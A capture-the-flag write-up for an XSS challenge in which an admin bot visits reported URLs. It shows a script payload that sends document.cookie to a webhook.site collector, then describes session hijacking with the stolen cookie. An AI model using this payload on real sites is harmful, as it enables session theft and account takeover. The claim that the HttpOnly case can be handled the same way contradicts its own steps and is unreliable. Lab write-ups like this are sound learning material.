# WS_3.01 — XSS Simple 1

---

## Problem description

A web application with an input field that renders user-controlled content, plus a *"Report an URL to the admin"* feature. Reported URLs are visited by an admin bot that carries a privileged cookie. The goal is to steal that cookie (or hijack the admin session) and read the flag that only the admin can see.

---

## Recon

Two facts make this exploitable together:

* The input field reflects/stores markup without sanitization — a classic XSS sink.
* The admin bot visits any URL submitted through the report form, executing whatever runs in that page as the admin.

---

## Exploit, step by step

1. Set up a collector to receive the exfiltrated data — [webhook.site](https://webhook.site/) gives a unique URL out of the box.

2. Build the payload that leaks the visitor's cookie to that collector:

   ```html
   <script>
       fetch('https://webhook.site/<your_id>?c=' + document.cookie);
   </script>
   ```

3. Trigger the sink via the URL, so the payload travels URL-encoded (e.g. `?param=%3Cscript%3E...`). Copy the full crafted URL.

4. Submit that URL through *"Report an URL to the admin"*. The admin bot opens it, the script runs with the admin's context, and its cookie lands on the webhook as the `c` parameter.

5. Read the value on webhook.site. If the flag is in the cookie, it is already there. If the session is server-side (or the cookie is `HttpOnly`), fall back to **session hijacking**:

   * Back on the challenge site, open DevTools (`F12`) → **Storage** → **Cookies**.
   * Replace your current cookie value with the stolen one.
   * Reload — the site now treats you as the admin, and the flag appears in the admin panel.

---

## Flag

```
CCIT{****************}
```

---

## What I learned

* An admin-bot report feature turns a reflected/stored XSS into a credential-theft primitive: you make a privileged victim run your code.
* `document.cookie` exfiltration only works if the cookie is readable from JS; when it is `HttpOnly`, stealing the session and swapping it into your own browser achieves the same access.
* `webhook.site` is a fast, zero-setup collector for out-of-band data during XSS testing.